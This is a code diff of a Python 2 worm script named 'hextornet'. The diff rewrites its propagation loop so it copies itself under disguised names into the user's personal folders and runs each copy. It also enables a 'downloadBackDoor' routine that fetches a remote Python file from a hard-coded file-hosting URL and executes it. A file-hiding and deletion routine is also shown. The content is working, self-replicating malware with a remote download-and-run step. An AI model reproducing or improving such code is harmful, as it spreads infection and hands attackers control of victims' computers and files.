@@ -4,13 +4,10 @@
 #from _winreg import *
 from shutil import copyfile
 import os, getpass
-from sys import argv
 import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
 import shutil
-import locale
-from random import randint
 
 
 print(
@@ -29,18 +26,13 @@ code = """#!/usr/bin/env python
 #from _winreg import *
 from shutil import copyfile
 import os, getpass
-from sys import argv
 import os, random, sys, pkg_resources
 from urllib2 import urlopen
 import subprocess as sp
 import shutil
-import locale
-from random import randint
 
-
-src = os.path.abspath('hextornet.py')
+src = os.path.abspath(__file__)
 usr = getpass.getuser()
-lang = locale.getdefaultlocale()
 
 hextornet = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
 directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
@@ -84,32 +76,14 @@ def copyHex(hexworm, src, dst):
 
 def propagate():
 	print("==========Worm location==========")
-	while len(directories) != 0:
-		for directory in directories:
-			if windows_client():
-				for hexworm in hextornet:
-					dst = "C:\Users" + usr + "/" + directory + "/" + str(hexworm) + ".py"
-			elif linux_client():
-				for hexworm in hextornet:
-					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
-			else:
-				dst = os.getcwd() + "hextornet.py"
-			copyHex(hexworm, src, dst)
-			directories.remove(directory)
+	for d, w in hexDir:
+		if linux_client():
+			dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
+		elif windows_client():
+			dst = "C:\Users" + usr + "/" + d + "/" + str(w) + ".py"
+		copyHex(w, src, dst)
+		duplicate(dst)
 	print("=================================")
-
-def hide():
-        for fname in os.listdir('.'):
-                if fname.find('.py') == len(fname) - len('.py'):
-                        #make the file hidden
-                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_HIDDEN)
-                elif fname.find('.txt') == len(fname) - len('.txt'):
-                        #make the file read only
-                        win32api.SetFileAttributes(fname,win32con.FILE_ATTRIBUTE_READONLY)
-                else:
-                        #to force deletion of a file set it to normal
-                        win32api.SetFileAttributes(fname, win32con.FILE_ATTRIBUTE_NORMAL)
-			os.remove(fname)
 
 
 def downloadBackDoor(url):
@@ -120,9 +94,10 @@ def downloadBackDoor(url):
 	content = urlopen(url).read()
         outfile = open(filename, "wb")
         outfile.write(content)
+	print(outfile)
 	print'...Writing file'
         outfile.close()
-        #run(os.path.abspath(filename))
+        run(os.path.abspath(filename))
 	print'==========finish downloading=========='
 	print''
 
@@ -136,7 +111,6 @@ def run(program):
 def main():
 	#hide()
 	#addStartup()
-	#propagate()
 	#hide()
 	downloadBackDoor("https://cdn.fbsbx.com/v/t59.2708-21/24297685_1903721959657007_3729764176965402624_n.py/registro.py?_nc_cat=103&oh=94924732aeb080d40407392e177da87d&oe=5BAB8629&dl=1")
 
@@ -148,10 +122,10 @@ if __name__ == "__main__":
 
 src = os.path.abspath('hextornet.py')
 usr = getpass.getuser()
-lang = locale.getdefaultlocale()
 
 hextornet = ['winHex', 'Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
 directories = ['Documents', 'Downloads', 'Music', 'Pictures', 'Videos']
+hexDir = zip(directories, hextornet)
 
 dst = ""
 
@@ -197,22 +171,15 @@ def duplicate(hexfile):
 
 def propagate():
 	print("==========Worm location==========")
-	while len(directories) != 0:
-		for directory in directories:
-			if windows_client():
-				for hexworm in hextornet:
-					dst = "C:\\Users\\" + usr + "\\" + directory + "\\" + str(hexworm) + '.py'
-			elif linux_client():
-				for hexworm in hextornet:
-					dst = '/' + usr + '/' + directory + '/' + str(hexworm) + '.py'
-			else:
-				dst = os.getcwd() + "hextornet.py"
-			copyHex(hexworm, src, dst)
-			duplicate(dst)
-			run(dst)
-			directories.remove(directory)
+	for d, w in hexDir:
+		if linux_client():
+			dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
+		elif windows_client():
+			dst = "C:\Users" + usr + "/" + d + "/" + str(w) + ".py"
+		copyHex(w, src, dst)
+		duplicate(dst)
+		run(dst)
 	print("=================================")
-
 
 def hide():
         for fname in os.listdir('.'):
@@ -243,7 +210,7 @@ def downloadBackDoor(url):
 
 def run(program):
 	print'[RUNNING]',program
-	process = sp.Popen('python '+program, shell=True)
+	process = sp.Popen('python ' + program, shell=True)
 	process.wait()
 
 
